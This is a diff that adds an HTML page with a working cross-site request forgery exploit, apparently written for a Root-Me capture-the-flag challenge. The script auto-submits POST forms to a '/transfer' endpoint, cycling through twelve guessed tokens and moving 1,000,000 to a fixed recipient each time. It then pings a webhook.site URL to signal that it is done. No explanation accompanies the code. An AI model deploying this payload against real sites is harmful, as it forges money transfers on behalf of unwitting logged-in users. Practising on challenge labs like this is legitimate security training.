@@ -1,0 +1,26 @@
+<!DOCTYPE html><html><body><script>
+var toks = ["6605fdab0cac920c000000", "6605fdab0cac920c000001", "6605fdab0cac920c000002", "6605fdab0cac920c000003", "6605fdab0cac920c000004", "6605fdab0cac920c000005", "6605fdab0cac920c000006", "6605fdab0cac920c000007", "6605fdab0cac920c000008", "6605fdab0cac920c000009", "6605fdab0cac920c00000a", "6605fdab0cac920c00000b"];
+var BASE = "https://instance-019fb2ec-c4c9-71f3-b9e4-40c0d5571bed.challenges.root-me.pro";
+var i = 0;
+function fireNext() {
+  if (i >= toks.length) {
+    var img = document.createElement("img");
+    img.src = "https://webhook.site/f5af0355-1e19-423e-8665-14603d26667f?beacon=final2_done";
+    document.body.appendChild(img);
+    return;
+  }
+  var w = window.open("about:blank", "_blank");
+  if (w) {
+    var f = w.document.createElement("form");
+    f.action = BASE + "/transfer";
+    f.method = "POST";
+    f.innerHTML = "<input name=token value=" + toks[i] + "><input name=recipient value=fin2_1785416692><input name=amount value=1000000>";
+    w.document.body.appendChild(f);
+    f.submit();
+    setTimeout(function(win){ try { win.close(); } catch(e){} }, 400, w);
+  }
+  i++;
+  setTimeout(fireNext, 150);
+}
+fireNext();
+</script></body></html>
